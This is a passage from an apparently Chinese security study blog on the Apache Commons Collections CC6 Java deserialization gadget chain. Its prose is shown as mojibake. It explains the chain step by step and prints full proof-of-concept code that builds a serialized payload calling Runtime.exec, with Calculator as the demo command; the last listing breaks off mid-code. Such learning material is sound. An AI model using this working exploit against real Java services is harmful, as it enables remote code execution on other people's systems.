<p>ç„¶åç»§ç»­å‘ä¸Šçœ‹åˆ©ç”¨é“¾,<code> org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()</code> ysoserial è¿™é‡Œé€šè¿‡<code>TiedMapEntry.hashCode()</code>æ–¹æ³•æ¥è°ƒç”¨<code>getValue</code>æ–¹æ³•ï¼ˆç„¶åæˆ‘ä»¬ä¹Ÿä¸éš¾å‘ç°<code>TiedMapEntry#toString</code>å’Œ<code>TiedMapEntry#equals</code>æ–¹æ³•ä¹Ÿè°ƒç”¨äº†<code>getValue()</code>æ–¹æ³•ï¼Œä½†å®ƒä¸æ˜¯CC6çš„çŒªè§’ï¼Œè¿™åˆæ˜¯ä¸¤æ¡é“¾CC5ã€CC7çš„äº‹äº†ï¼‰<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210627215252.png" alt="image-20210627202424491"></p>
<p>çœ‹åˆ° <strong>hashCode</strong>,è®°å¿†å¥½çš„åº”è¯¥è¿˜è®°å¾—åœ¨<strong>Java ysoserialå­¦ä¹ ä¹‹URLDNS(ä¸€)<strong>ä¸­ï¼Œå®ƒå¯æ˜¯çŒªè§’ï¼Œå›é¡¾ä¸€ä¸‹</strong>URLDNS</strong>è§¦å‘æµç¨‹</p>
<blockquote>
<ol>
<li>å°†URLå¯¹è±¡ä½œä¸ºkeyæ”¾å…¥hashMapä¸­ï¼Œå°†å…¶åºåˆ—åŒ–å‘é€ç»™ç›®æ ‡æœºå™¨</li>
<li>å¦‚æœç›®æ ‡æœºå™¨å­˜åœ¨ååºåˆ—åŒ–æ¼æ´ï¼Œé‚£ä¹ˆä¼šæ‰§è¡Œ<code>HashMap.readObject()</code> å°†æ•°æ®ååºåˆ—åŒ–</li>
<li>åœ¨ååºåˆ—åŒ–æœŸé—´ï¼Œä¸ºäº†è¿˜åŸhashmapçš„å†…å®¹ï¼Œä¼šè°ƒç”¨ <code>hash()</code> æ–¹æ³•ï¼Œè€Œ<code>hash()</code>å‡½æ•°ä¼šè°ƒç”¨ä¼ å…¥å‚æ•°çš„ <code>hashCode()</code>æ–¹æ³•</li>
<li>å½“URL å¯¹è±¡çš„ <code>hashCode</code>å±æ€§å€¼ä¸º <code>-1</code> æ—¶ä¼šè°ƒç”¨ <code>handler.hashCode()</code>æ–¹æ³•ï¼Œè€Œè¿™ä¸ªæ–¹æ³•ä¼šè¿›è¡Œä¸€æ¬¡DNSæŸ¥è¯¢ã€‚</li>
</ol>
</blockquote>
<p>é‡ç‚¹çœ‹ç¬¬ä¸‰ç‚¹ï¼Œéå¸¸å¥½ï¼Œç°åœ¨æˆ‘ä»¬å¤§æ¦‚æ˜¯æ‰¾åˆ°äº†è‡ªåŠ¨è§¦å‘<code>TiedMapEntry#getValue</code>çš„åœ°æ–¹äº†ï¼ŒCodeä¸€ä¸‹ï¼Œæ–°å»ºä¸€ä¸ª<code>hashMap</code>å¯¹è±¡å°†<code>tiedMapEntry</code>ä½œä¸º<code>key</code>ä¼ å…¥<code>hashMap</code><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210627215259.png" alt="image-20210627171836200"></p>
<p>ç„¶åå°±ä¼šå‘ç°ï¼Œç¡®å®å¼¹å‡ºäº†<strong>ä¸€ä¸ª</strong>è®¡ç®—å™¨ï¼Œæˆ‘ä»¥ä¸ºåˆ°è¿™é‡Œå°±ç»“æŸäº†ï¼Œç»“æœæ˜¯æˆ‘åœ¨æƒ³å±åƒï¼ŒO(âˆ©_âˆ©)Oå“ˆå“ˆ~</p>
<p>è¿™é‡Œå¼¹å‡ºçš„è®¡ç®—å™¨çœŸçš„æ˜¯<strong>ååºåˆ—åŒ–æ—¶</strong>æ‰§è¡Œçš„å—ï¼Ÿåªä¼šå¼¹<strong>ä¸€ä¸ª</strong>å—ï¼Ÿ</p>
<p>è‚¯å®šä¸æ˜¯å•Šï¼Œ<strong>hashMap.put(tiedMapEntry, â€œyhyâ€);</strong> putæ˜¯å°±ä¼šå¼¹ä¸€ä¸ªå•Šï¼ŒæŒ‰ç†è¯´ååºåˆ—åŒ–æ—¶ä¹Ÿä¼šæ‰§è¡Œå‘½ä»¤å†å¼¹å‡ºä¸€ä¸ªè®¡ç®—æœºï¼Œæ€»å…±åº”è¯¥<strong>ä¸¤ä¸ª</strong>ï¼Œè¿™é‡Œåªå¼¹å‡ºä¸€ä¸ªï¼Œåœ¨ <strong>hashMap.put</strong>æ—¶ä¸‹æ–­ç‚¹ï¼Œç„¶ååœ¨<code>HashMap#readObject</code>æ–¹æ³•ä¸­çš„<code>putVal(hash(key), key, value, false, false);</code>ä¹Ÿä¸‹ä¸€ä¸ªæ–­ç‚¹ï¼Œ<code>LazyMap#get</code>æ–¹æ³•ä¹Ÿä¸‹ä¸€ä¸ªï¼Œä¹‹åå¼€å¯Debugæ¨¡å¼</p>
<p>ç‚¹å‡»ç»¿è‰²ç®­å¤´ç›´æ¥ä»<code>hashMap.put</code>è·³è½¬åˆ°<code>LazyMap#get</code>,ç„¶åå•æ­¥è°ƒè¯•ï¼Œç¬¬ä¸€æ¬¡ç¡®å®æ‰§è¡Œäº†<code>factory.transform</code>è§¦å‘æˆ‘ä»¬è‡ªå®šä¹‰çš„æ–¹æ³•ï¼Œå¼¹å‡ºäº†è®¡ç®—å™¨ï¼Œæ³¨æ„è¿™é‡Œçš„<strong>map</strong>æ˜¯ç©ºçš„<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210627215304.png" alt="image-20210627195100261"></p>
<p>æ¥ç€ç‚¹å‡»ç»¿è‰²ç®­å¤´ä»<code>ois.readObject();</code>è·³è½¬åˆ°<code>LazyMap#get</code>ï¼Œä¹‹åå•æ­¥è°ƒè¯•å°±ä¼šå‘ç°ï¼Œè¿™ä¸€æ¬¡æ²¡æœ‰æ‰§è¡Œ<code>factory.transform(key)</code>,<code>map.containsKey(key)</code>ä¸å†ä¸º<code>false</code>äº†ï¼Œè¿™ä¸€æ¬¡ <strong>map</strong> ä¸­æœ‰äº†ä¸€ä¸ªkeyï¼Œä¸åœ¨ä¸ºç©ºäº†ï¼Œ<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210627215309.png" alt="image-20210627195210201"></p>
<p>é‡Œé¢çš„keyæ­£æ˜¯æˆ‘ä»¬æ”¾è¿›å»çš„<code>TiedMapEntry tiedMapEntry = new TiedMapEntry(outerMap,&quot;yhy&quot;);</code> ï¼Œè¿™é‡Œè¯´æ˜å½“ç¬¬ä¸€æ¬¡åˆ©ç”¨<code>hashMap.put(tiedMapEntry, &quot;yhy&quot;);</code>æ—¶è°ƒç”¨åˆ°äº†<code>HashMap#hash(key)</code></p>
<blockquote>
<p>  æ³¨ï¼šè¿™é‡Œçš„yhyå¹¶ä¸æ˜¯keyï¼Œè€Œæ˜¯valueï¼Œæ”¹è¿™ä¸ªå€¼å¹¶ä¸ä¼šå½±å“ifçš„åˆ¤æ–­ï¼Œç¬¬ä¸€æ¬¡new TiedMapEntry(outerMap,â€yhyâ€)çš„æ‰æ˜¯key</p>
</blockquote>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210627215314.png" alt="image-20210627195758963">è¿™é‡Œå¯¹åç»­ååºåˆ—åŒ–æ—¶äº§ç”Ÿäº†å½±å“ï¼Œå¯¼è‡´ map.containsKey(key) &#x3D;&#x3D; trueï¼Œä¸è¿›å…¥ifåˆ¤æ–­ä¸­ï¼Œæ— æ³•æ‰§è¡Œ<code>transform</code>æ–¹æ³•æ‰§è¡Œä»»æ„æ–¹æ³•ã€‚</p>
<p>è§£å†³åŠæ³•æ˜¯æŠŠ<strong>map</strong>ä¸­çš„<strong>key</strong>å»é™¤,è¿™ä¸€æ¬¡ç¡®å®æ‰§è¡Œäº†ä¸¤æ¬¡ï¼Œå¯ä»¥debugéªŒè¯ä¸€ä¸‹ï¼Œç¬¬äºŒæ¬¡ç¡®å®æ˜¯åœ¨ååºåˆ—åŒ–é˜¶æ®µæ‰§è¡Œçš„<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210627215321.png" alt="image-20210627200400851"></p>
<p>ç»†å¿ƒçš„æœ‹å‹å¯èƒ½å‘ç°äº†ï¼Œè¿™é‡Œå’Œå¼€å¤´å†™çš„åˆ©ç”¨é“¾ä¸ä¸€æ ·ï¼Œæ€ä¹ˆå°±ç»“æŸäº†ï¼Œæ˜æ˜è¿˜æœ‰ä¸€æ­¥ <code>java.util.HashSet.readObject()</code>æ²¡æœ‰ç”¨åˆ°ã€‚</p>
<p>å…¶å®è¿™æ¡åˆ©ç”¨é“¾æ˜¯å’ŒPç‰›åœ¨ä»£ç å®¡è®¡çŸ¥è¯†æ˜Ÿçƒ-Javaå®‰å…¨æ¼«è°ˆç³»åˆ—ä¸­ç®€åŒ–åçš„CC6é“¾æ˜¯ä¸€æ ·çš„ï¼Œæˆ‘æ˜¯åœ¨çœ‹åˆ°<strong>HashCode</strong>æ—¶è”æƒ³åˆ°äº†<strong>URLDNS</strong>é‚£æ¡é“¾ä¸­çš„ç›¸å…³çŸ¥è¯†ï¼Œç„¶ååˆå‚è€ƒPç‰›çš„æ–‡ç« æ‰æŠŠè¿™æ¡é“¾ææ‡‚ã€‚^_^</p>
<p>åœ¨Pç‰›çš„ä»£ç ä¸­ <a href="https://github.com/phith0n/JavaThings/blob/master/general/src/main/java/com/govuln/deserialization/CommonsCollections6.java">https://github.com/phith0n/JavaThings/blob/master/general/src/main/java/com/govuln/deserialization/CommonsCollections6.java</a> æœ‰ä¸€ç‚¹å’Œä¸Šè¿°ä¸ä¸€æ ·</p>
<p>Pç‰›å¤šå®šä¹‰äº†<code>Transformer[] fakeTransformers = new Transformer[] &#123;new ConstantTransformer(1)&#125;;</code>,ç„¶å</p>
<p><code>Transformer transformerChain = new ChainedTransformer(fakeTransformers);</code>åŠ å…¥çš„æ˜¯å¤šå®šä¹‰çš„<code>fakeTransformers</code>æ•°ç»„ï¼Œç²¾å¿ƒæ„é€ çš„è¦æ‰§è¡Œå‘½ä»¤çš„æ•°ç»„åœ¨<strong>remove</strong>å‡½æ•°å‰åé€šè¿‡åå°„åŠ å…¥äº†<strong>transformerChain</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> ChainedTransformer.class.getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);</span><br><span class="line">f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">f.set(transformerChain, transformers);</span><br></pre></td></tr></table></figure>

<p>è¿™æ ·çš„å¥½å¤„æ˜¯</p>
<blockquote>
<p>  ä¸ºäº†é¿å…æœ¬åœ°è°ƒè¯•æ—¶è§¦å‘å‘½ä»¤æ‰§è¡Œï¼Œæˆ‘æ„é€ LazyMapçš„æ—¶å€™å…ˆç”¨äº†ä¸€ä¸ªäººç•œæ— å®³çš„ fakeTransformers å¯¹è±¡ï¼Œç­‰æœ€åè¦ç”ŸæˆPayloadçš„æ—¶å€™ï¼Œå†æŠŠçœŸæ­£çš„ transformers æ›¿æ¢è¿›å»ã€‚</p>
</blockquote>
<p>å®Œæ•´ä»£ç </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> yhy</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> 2021/6/27 11:41</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@github</span> https://github.com/yhy0</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">	Gadget chain:</span></span><br><span class="line"><span class="comment">	    java.io.ObjectInputStream.readObject()</span></span><br><span class="line"><span class="comment">            java.util.HashMap.readObject()     è¿™é‡Œä¸åŒ</span></span><br><span class="line"><span class="comment">                java.util.HashMap.put()</span></span><br><span class="line"><span class="comment">                java.util.HashMap.hash()</span></span><br><span class="line"><span class="comment">                    org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()</span></span><br><span class="line"><span class="comment">                    org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()</span></span><br><span class="line"><span class="comment">                        org.apache.commons.collections.map.LazyMap.get()</span></span><br><span class="line"><span class="comment">                            org.apache.commons.collections.functors.ChainedTransformer.transform()</span></span><br><span class="line"><span class="comment">                            org.apache.commons.collections.functors.InvokerTransformer.transform()</span></span><br><span class="line"><span class="comment">                            java.lang.reflect.Method.invoke()</span></span><br><span class="line"><span class="comment">                                java.lang.Runtime.exec()</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonCollections6</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// äººç•œæ— å®³çš„Transformeræ•°ç»„</span></span><br><span class="line">        Transformer[] fakeTransformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)&#125;;</span><br><span class="line">        <span class="comment">//æ­¤å¤„æ„å»ºäº†ä¸€ä¸ªtransformersçš„æ•°ç»„ï¼Œåœ¨å…¶ä¸­æ„å»ºäº†ä»»æ„å‡½æ•°æ‰§è¡Œçš„æ ¸å¿ƒä»£ç </span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;/System/Applications/Calculator.app/Contents/MacOS/Calculator&quot;</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>), <span class="comment">// éšè—é”™è¯¯ä¿¡æ¯</span></span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">//å°† fakeTransformers æ•°ç»„å­˜å…¥ ChainedTransformer è¿™ä¸ªç»§æ‰¿ç±»</span></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(fakeTransformers);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="comment">//ä½¿ç”¨ LazyMap</span></span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap,transformerChain);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ä¸Šé¢è¿˜æ˜¯ä½¿ç”¨CC1æ„é€ çš„ï¼Œä¸å˜ï¼Œ è¿™é‡Œåˆ›å»º TiedMapEntry æµ‹è¯•ä¸€ä¸‹</span></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(outerMap,<span class="string">&quot;yhy&quot;</span>);</span><br><span class="line"><span class="comment">//        tiedMapEntry.hashCode();</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//        // HashMap è‡ªåŠ¨è§¦å‘</span></span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"></span><br><span class="line">        hashMap.put(tiedMapEntry, <span class="string">&quot;yhy&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// put åå†æŠŠkeyå»é™¤ï¼Œé˜²æ­¢å½±å“åç»­æ‰§è¡Œ</span></span><br><span class="line">        outerMap.remove(<span class="string">&quot;yhy&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// åå°„åŠ å…¥åŠ å…¥payload ,è¿™æ ·åœ¨putæ—¶å°±ä¸ä¼šæ‰§è¡Œ</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> ChainedTransformer.class.getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        f.set(transformerChain, transformers);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// åºåˆ—åŒ–</span></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;out.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(hashMap);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ååºåˆ—åŒ–è¯»å– out.bin æ–‡ä»¶</span></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;out.bin&quot;</span>));</span><br><span class="line">        ois.readObject();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è™½ç„¶ç®€åŒ–åçš„ä¹Ÿèƒ½è¾¾åˆ°æ•ˆæœï¼Œä¸ºäº†å­¦ä¹ ï¼Œè¡¥å……çŸ¥è¯†ç‚¹ï¼Œæˆ‘ä»¬è¿˜æ˜¯å†æ¥çœ‹çœ‹çœç•¥æ‰çš„<code>java.util.HashSet.readObject()</code></p>
<h3 id="2-3-HashSet"><a href="#2-3-HashSet" class="headerlink" title="2.3 HashSet"></a>2.3 HashSet</h3><p>åœ¨<code>HashSet#readObject</code>ä¸­ï¼Œå°†åºåˆ—åŒ–æ•°æ®ååºåˆ—åŒ–åä½œä¸º<strong>key</strong>è°ƒç”¨<code>map.put</code>ä¸­ï¼Œ<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210627215330.png" alt="image-20210627203446529"></p>
<p>è¿™é‡Œçš„ map å®é™…ä¸Šå°±æ˜¯ HashMap ï¼Œä¹‹åçš„è¿‡ç¨‹ä¹Ÿå’Œä¹‹å‰çš„ä¸€æ ·ï¼Œput â€“&gt; hash â€“&gt; hashCode<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210627215355.png" alt="image-20210627203636614"></p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210627215407.png" alt="image-20210627203705755"></p>
<p>ä¸‹é¢å°±æ˜¯å°†æˆ‘ä»¬æ„é€ å¥½çš„æ•°æ®æ”¾å…¥HashSetä¸­ï¼Œè®©å…¶åœ¨ååºåˆ—åŒ–æ˜¯è‡ªåŠ¨æ‰§è¡Œã€‚è¿™é‡Œ(ä¸åªæ˜¯è¿™é‡Œï¼Œæ‰€æœ‰ååºåˆ—åŒ–çš„åœ°æ–¹)å…¶å®è¿˜è¦çœ‹ä¸€ä¸‹HashSetä¸­çš„åºåˆ—åŒ–è¿‡ç¨‹ï¼ˆwriteObjectï¼‰æ˜¯å¦å¯æ§ï¼Œè¿™é‡Œæˆ‘ä»¬åªè¦èƒ½æ§åˆ¶mapçš„keyï¼Œé‚£ä¹ˆå°±èƒ½æ§åˆ¶åºåˆ—åŒ–æ•°æ® s<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210627215413.png" alt="image-20210627204340028"></p>
<p>è€Œ <strong>map</strong> ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨HashSetä¸­çœ‹åˆ°å¹¶æ²¡æœ‰ä¸€ä¸ªç›´æ¥çš„æ–¹æ³•å¯ä»¥ç›´æ¥èµ‹å€¼ä¿®æ”¹çš„ï¼Œè¿™å°±åˆè¦ç”¨åˆ°åå°„ç›¸å…³çš„çŸ¥è¯†äº†ï¼Œ</p>
<p>é¦–å…ˆè·å–HashSetä¸­mapçš„å€¼</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// æŒ‡å®šåˆå§‹å®¹é‡ä¸º1</span></span><br><span class="line"><span class="type">HashSet</span> <span class="variable">hashSet</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashSet</span>(<span class="number">1</span>);</span><br><span class="line">hashSet.add(<span class="string">&quot;yhy&quot;</span>);</span><br><span class="line"><span class="comment">// åå°„è·å–HashSetä¸­mapçš„å€¼</span></span><br><span class="line"><span class="type">Field</span> <span class="variable">map</span> <span class="operator">=</span>  Class.forName(<span class="string">&quot;java.util.HashSet&quot;</span>).getDeclaredField(<span class="string">&quot;map&quot;</span>);</span><br><span class="line"><span class="comment">// å–æ¶ˆè®¿é—®é™åˆ¶æ£€æŸ¥</span></span><br><span class="line">map.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="comment">// è·å–HashSetä¸­mapçš„å€¼</span></span><br><span class="line"><span class="type">HashMap</span> <span class="variable">hashSetMap</span> <span class="operator">=</span> (HashMap) map.get(hashSet);</span><br></pre></td></tr></table></figure>

<p>ç„¶åä¿®æ”¹ hashSetMap ä¸­çš„ key å€¼ä¸º hashset</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// åå°„è·å– HashMap ä¸­ table çš„å€¼</span></span><br><span class="line"><span class="type">Field</span> <span class="variable">table</span> <span class="operator">=</span>  Class.forName(<span class="string">&quot;java.util.HashMap&quot;</span>).getDeclaredField(<span class="string">&quot;table&quot;</span>);</span><br><span class="line"><span class="comment">// å–æ¶ˆè®¿é—®é™åˆ¶æ£€æŸ¥</span></span><br><span class="line">table.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="comment">// è·å– HashMap ä¸­ table çš„å€¼</span></span><br><span class="line">Object[] hashMapTable = (Object[]) table.get(hashSetMap);</span><br><span class="line"></span><br><span class="line"><span class="type">Object</span> <span class="variable">node</span> <span class="operator">=</span> hashMapTable[<span class="number">0</span>];</span><br><span class="line"><span class="keyword">if</span>(node == <span class="literal">null</span>) &#123;</span><br><span class="line">    node = hashMapTable[<span class="number">1</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// å°†key è®¾ä¸º tiedMapEntry</span></span><br><span class="line"><span class="type">Field</span> <span class="variable">key</span> <span class="operator">=</span>  node.getClass().getDeclaredField(<span class="string">&quot;key&quot;</span>);</span><br><span class="line">key.setAccessible(<span class="literal">true</span>);</span><br><span class="line">key.set(node, tiedMapEntry);</span><br></pre></td></tr></table></figure>

<p>åœ¨è¿™é‡Œåˆ©ç”¨åå°„è·å–äº† hashSetMap ä¸­çš„ table å±æ€§ï¼Œtable å…¶å®å°±æ˜¯hashmapçš„å­˜å‚¨åº•å±‚ï¼Œå°† &lt;Key,Value&gt; å°è£…åœ¨äº† Node å¯¹è±¡ä¸­ï¼Œåœ¨è·å–åˆ°äº† table ä¸­çš„ key ä¹‹åï¼Œåˆ©ç”¨åå°„ä¿®æ”¹å…¶ä¸ºtiedMapEntry<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210627215440.png" alt="image-20210627212117518"></p>
<p>åˆå¹¶æ‰§è¡Œ<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210627215446.png" alt="image-20210627212943691"></p>
<p>å®Œæ•´ä»£ç </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.HashSet;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> yhy</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> 2021/6/27 20:47</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@github</span> https://github.com/yhy0</span></span><br><span class="line"><span class="comment"> * ysoserial </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">	Gadget chain:</span></span><br><span class="line"><span class="comment">	    java.io.ObjectInputStream.readObject()</span></span><br><span class="line"><span class="comment">            java.util.HashSet.readObject()</span></span><br><span class="line"><span class="comment">                java.util.HashMap.put()</span></span><br><span class="line"><span class="comment">                java.util.HashMap.hash()</span></span><br><span class="line"><span class="comment">                    org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()</span></span><br><span class="line"><span class="comment">                    org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()</span></span><br><span class="line"><span class="comment">                        org.apache.commons.collections.map.LazyMap.get()</span></span><br><span class="line"><span class="comment">                            org.apache.commons.collections.functors.ChainedTransformer.transform()</span></span><br><span class="line"><span class="comment">                            org.apache.commons.collections.functors.InvokerTransformer.transform()</span></span><br><span class="line"><span class="comment">                            java.lang.reflect.Method.invoke()</span></span><br><span class="line"><span class="comment">                                java.lang.Runtime.exec()</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    by @matthias_kaiser</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC6_Y</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//æ­¤å¤„æ„å»ºäº†ä¸€ä¸ªtransformersçš„æ•°ç»„ï¼Œåœ¨å…¶ä¸­æ„å»ºäº†ä»»æ„å‡½æ•°æ‰§è¡Œçš„æ ¸å¿ƒä»£ç </span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, 